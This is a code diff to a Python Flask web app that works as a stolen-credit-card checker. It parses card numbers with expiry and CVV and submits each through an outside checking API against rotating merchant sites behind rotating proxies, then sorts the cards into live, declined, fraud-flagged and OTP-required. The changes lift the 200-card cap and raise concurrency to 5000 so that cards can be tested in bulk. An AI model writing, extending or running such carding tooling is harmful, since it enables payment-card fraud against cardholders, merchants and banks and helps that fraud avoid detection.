@@ -6,7 +6,6 @@ import time
 import asyncio
 import aiohttp
 import psycopg2
-import psycopg2.extras
 import psycopg2.pool
 from flask import Flask, render_template, request, jsonify
 from dotenv import load_dotenv
@@ -25,8 +24,8 @@ DB_POOL = None
 DB_POOL_MIN = 2
 DB_POOL_MAX = 20
 
-RECENT_SITES = deque(maxlen=10)
-RECENT_PROXIES = deque(maxlen=10)
+RECENT_SITES = deque(maxlen=50)
+RECENT_PROXIES = deque(maxlen=50)
 
 CHARGED_KEYWORDS = frozenset([
     'charged', 'charge success', 'charge_success',
@@ -86,42 +85,16 @@ def release_db(conn):
                 pass
 
 
-def init_db():
-    conn = get_db()
-    if not conn:
-        return
-    try:
-        with conn.cursor() as cur:
-            cur.execute("""
-                CREATE TABLE IF NOT EXISTS web_sites (
-                    id SERIAL PRIMARY KEY,
-                    url TEXT UNIQUE NOT NULL,
-                    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            """)
-            cur.execute("""
-                CREATE TABLE IF NOT EXISTS web_proxies (
-                    id SERIAL PRIMARY KEY,
-                    proxy TEXT UNIQUE NOT NULL,
-                    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            """)
-            conn.commit()
-    except Exception as e:
-        print(f"DB init error: {e}")
-    finally:
-        release_db(conn)
-
-
 def get_sites():
     conn = get_db()
     if not conn:
         return []
     try:
         with conn.cursor() as cur:
-            cur.execute("SELECT url FROM web_sites ORDER BY id")
-            return [row[0] for row in cur.fetchall()]
-    except:
+            cur.execute("SELECT DISTINCT url FROM sites ORDER BY url")
+            return [row[0] for row in cur.fetchall() if row[0]]
+    except Exception as e:
+        print(f"Error getting sites: {e}")
         return []
     finally:
         release_db(conn)
@@ -133,96 +106,11 @@ def get_proxies():
         return []
     try:
         with conn.cursor() as cur:
-            cur.execute("SELECT proxy FROM web_proxies ORDER BY id")
-            return [row[0] for row in cur.fetchall()]
-    except:
+            cur.execute("SELECT DISTINCT proxy FROM proxies ORDER BY proxy")
+            return [row[0] for row in cur.fetchall() if row[0]]
+    except Exception as e:
+        print(f"Error getting proxies: {e}")
         return []
-    finally:
-        release_db(conn)
-
-
-def add_sites(urls):
-    conn = get_db()
-    if not conn:
-        return 0
-    count = 0
-    try:
-        with conn.cursor() as cur:
-            for url in urls:
-                url = url.strip()
-                if url:
-                    try:
-                        cur.execute(
-                            "INSERT INTO web_sites (url) VALUES (%s) ON CONFLICT (url) DO NOTHING",
-                            (url,)
-                        )
-                        if cur.rowcount > 0:
-                            count += 1
-                    except:
-                        pass
-            conn.commit()
-    except:
-        conn.rollback()
-    finally:
-        release_db(conn)
-    return count
-
-
-def add_proxies(proxies):
-    conn = get_db()
-    if not conn:
-        return 0
-    count = 0
-    try:
-        with conn.cursor() as cur:
-            for proxy in proxies:
-                proxy = proxy.strip()
-                if proxy:
-                    try:
-                        cur.execute(
-                            "INSERT INTO web_proxies (proxy) VALUES (%s) ON CONFLICT (proxy) DO NOTHING",
-                            (proxy,)
-                        )
-                        if cur.rowcount > 0:
-                            count += 1
-                    except:
-                        pass
-            conn.commit()
-    except:
-        conn.rollback()
-    finally:
-        release_db(conn)
-    return count
-
-
-def remove_site(url):
-    conn = get_db()
-    if not conn:
-        return False
-    try:
-        with conn.cursor() as cur:
-            cur.execute("DELETE FROM web_sites WHERE url = %s", (url,))
-            conn.commit()
-            return cur.rowcount > 0
-    except:
-        conn.rollback()
-        return False
-    finally:
-        release_db(conn)
-
-
-def remove_proxy(proxy):
-    conn = get_db()
-    if not conn:
-        return False
-    try:
-        with conn.cursor() as cur:
-            cur.execute("DELETE FROM web_proxies WHERE proxy = %s", (proxy,))
-            conn.commit()
-            return cur.rowcount > 0
-    except:
-        conn.rollback()
-        return False
     finally:
         release_db(conn)
 
@@ -281,7 +169,7 @@ def parse_cards(text):
                 continue
         else:
             card_str = line.strip()
-        
+
         card_str = re.sub(r'\s+', ' ', card_str)
         match = re.search(r'(\d{13,19})\s*[|/\s]\s*(\d{1,2})\s*[|/\s]\s*(\d{2,4})\s*[|/\s]\s*(\d{3,4})', card_str)
         if match:
@@ -293,7 +181,7 @@ def parse_cards(text):
                 'formatted': f"{match.group(1)}|{match.group(2).zfill(2)}|{match.group(3)}|{match.group(4)}"
             })
             continue
-        
+
         match = re.search(r'(\d{13,19})\s*[|/\s]\s*(\d{1,2})\s*[|/\s]\s*(\d{2,4})\s*[|/\s]\s*(\d{3,4})', card_str)
         if match:
             cards.append({
@@ -303,13 +191,13 @@ def parse_cards(text):
                 'cvv': match.group(4),
                 'formatted': f"{match.group(1)}|{match.group(2).zfill(2)}|{match.group(3)}|{match.group(4)}"
             })
-    
+
     return cards
 
 
 def classify_response(api_response):
     combined = api_response.lower().strip()
-    
+
     if any(k in combined for k in CHARGED_KEYWORDS):
         return "LIVE", "🔥"
     if any(k in combined for k in ["fraud", "fraudulent", "high risk", "high_risk", "risk_review", "risk review", "suspicious", "do_not_honor", "do not honor", "pickup_card", "pickup card", "lost_card", "lost card", "stolen_card", "stolen card"]):
@@ -338,7 +226,7 @@ async def check_card(session, card, site, proxy_raw):
     url = f"{SAC_API}/mlsn?cc={cc}&site={site}"
     if proxy_converted:
         url += f"&proxy={proxy_converted}"
-    
+
     try:
         timeout = aiohttp.ClientTimeout(total=90)
         async with session.get(url, timeout=timeout, ssl=False) as resp:
@@ -356,23 +244,23 @@ async def check_card(session, card, site, proxy_raw):
                     'site': site,
                     'receipt_id': 'N/A'
                 }
-            
+
             api_response = str(raw.get("Response") or raw.get("response") or raw.get("message") or "").strip()
             price_raw = raw.get("Price") or raw.get("price") or raw.get("amount") or "-"
             currency = str(raw.get("Currency") or raw.get("currency") or "").strip()
-            
+
             if price_raw and str(price_raw) not in ("-", ""):
                 try:
                     price_val = f"{float(str(price_raw)):.2f}"
                     price_raw = f"{price_val} {currency}" if currency else f"${price_val}"
                 except:
                     price_raw = f"{price_raw} {currency}" if currency else str(price_raw)
-            
+
             gateway = raw.get("Gateway") or raw.get("gateway") or raw.get("Gate") or "Shopify Payments"
             receipt_id = str(raw.get("receipt_id") or raw.get("Receipt ID") or raw.get("receipt_ID") or "N/A").strip()
-            
+
             status, emoji = classify_response(api_response)
-            
+
             return {
                 'status': status,
                 'msg': f"{api_response} {emoji}",
@@ -404,10 +292,12 @@ async def check_card(session, card, site, proxy_raw):
         }
 
 
-async def check_cards_batch(cards, sites, proxies, concurrency=10):
+async def check_cards_batch(cards, sites, proxies, concurrency=5000):
     semaphore = asyncio.Semaphore(concurrency)
     results = []
-    
+
+    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, use_dns_cache=True)
+
     async def check_one(card, session):
         async with semaphore:
             site = pick_random_site(sites) if sites else ""
@@ -415,13 +305,13 @@ async def check_cards_batch(cards, sites, proxies, concurrency=10):
             result = await check_card(session, card, site, proxy)
             result['card'] = card.get('formatted', '')
             return result
-    
-    async with aiohttp.ClientSession() as session:
+
+    async with aiohttp.ClientSession(connector=connector) as session:
         tasks = [check_one(card, session) for card in cards]
         for coro in asyncio.as_completed(tasks):
             result = await coro
             results.append(result)
-    
+
     return results
 
 
@@ -430,68 +320,27 @@ def index():
     return render_template('index.html')
 
 
-@app.route('/api/sites', methods=['GET'])
-def api_get_sites():
-    return jsonify(get_sites())
-
-
-@app.route('/api/sites', methods=['POST'])
-def api_add_sites():
-    data = request.json
-    urls = data.get('urls', [])
-    count = add_sites(urls)
-    return jsonify({'added': count})
-
-
-@app.route('/api/sites/<path:url>', methods=['DELETE'])
-def api_delete_site(url):
-    removed = remove_site(url)
-    return jsonify({'removed': removed})
-
-
-@app.route('/api/proxies', methods=['GET'])
-def api_get_proxies():
-    return jsonify(get_proxies())
-
-
-@app.route('/api/proxies', methods=['POST'])
-def api_add_proxies():
-    data = request.json
-    proxies = data.get('proxies', [])
-    count = add_proxies(proxies)
-    return jsonify({'added': count})
-
-
-@app.route('/api/proxies/<path:proxy>', methods=['DELETE'])
-def api_delete_proxy(proxy):
-    removed = remove_proxy(proxy)
-    return jsonify({'removed': removed})
-
-
 @app.route('/api/check', methods=['POST'])
 def api_check():
     data = request.json
     cards_text = data.get('cards', '')
     mode = data.get('mode', 'sac')
-    
+
     cards = parse_cards(cards_text)
     if not cards:
         return jsonify({'error': 'No valid cards found'}), 400
-    
-    if len(cards) > 200:
-        return jsonify({'error': 'Maximum 200 cards per request'}), 400
-    
+
     sites = get_sites()
     proxies = get_proxies()
-    
-    concurrency = 20 if mode == 'msac' else 10
-    
+
+    concurrency = 5000 if mode == 'msac' else 5000
+
     loop = asyncio.new_event_loop()
     try:
         results = loop.run_until_complete(check_cards_batch(cards, sites, proxies, concurrency))
     finally:
         loop.close()
-    
+
     stats = {
         'total': len(results),
         'live': sum(1 for r in results if r['status'] == 'LIVE'),
@@ -500,7 +349,7 @@ def api_check():
         'low_balance': sum(1 for r in results if r['status'] == 'LOW_BALANCE'),
         'otp': sum(1 for r in results if r['status'] == 'OTP_REQUIRED'),
     }
-    
+
     return jsonify({'results': results, 'stats': stats})
 
 
@@ -508,33 +357,30 @@ def api_check():
 def api_check_upload():
     if 'file' not in request.files:
         return jsonify({'error': 'No file uploaded'}), 400
-    
+
     file = request.files['file']
     mode = request.form.get('mode', 'sac')
-    
+
     if not file.filename:
         return jsonify({'error': 'No file selected'}), 400
-    
+
     content = file.read().decode('utf-8', errors='ignore')
     cards = parse_cards(content)
-    
+
     if not cards:
         return jsonify({'error': 'No valid cards found in file'}), 400
-    
-    if len(cards) > 200:
-        return jsonify({'error': 'Maximum 200 cards per request'}), 400
-    
+
     sites = get_sites()
     proxies = get_proxies()
-    
-    concurrency = 20 if mode == 'msac' else 10
-    
+
+    concurrency = 5000 if mode == 'msac' else 5000
+
     loop = asyncio.new_event_loop()
     try:
         results = loop.run_until_complete(check_cards_batch(cards, sites, proxies, concurrency))
     finally:
         loop.close()
-    
+
     stats = {
         'total': len(results),
         'live': sum(1 for r in results if r['status'] == 'LIVE'),
@@ -543,7 +389,7 @@ def api_check_upload():
         'low_balance': sum(1 for r in results if r['status'] == 'LOW_BALANCE'),
         'otp': sum(1 for r in results if r['status'] == 'OTP_REQUIRED'),
     }
-    
+
     return jsonify({'results': results, 'stats': stats})
 
 
@@ -557,8 +403,6 @@ def api_stats():
         'api_url': SAC_API
     })
 
-
-init_db()
 
 if __name__ == '__main__':
     port = int(os.getenv('PORT', 8000))
